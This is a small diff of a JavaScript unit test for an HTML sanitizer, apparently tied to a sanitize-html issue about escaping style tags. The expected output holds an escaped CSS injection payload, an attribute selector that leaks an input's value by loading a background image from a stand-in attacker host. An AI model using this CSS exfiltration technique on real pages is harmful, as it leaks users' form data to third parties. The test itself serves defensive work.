@@ -105,7 +105,7 @@ describe('should not allow CSS attacks by escaping the style tag', () => {
     // This test does not, because the whole line get s discarded
     // also my issue
     // https://github.com/apostrophecms/sanitize-html/issues/334
-    expect(sanitize(css, {disallowedTagsMode:'escape'})).toBe(
+    expect(sanitizeHTML(css)).toBe(
       '&lt;style&gt;#username[value="mikeg"] {background:url("https://attacker.host/mikeg");}&lt;/style&gt;&lt;input /&gt;'
     );
   });
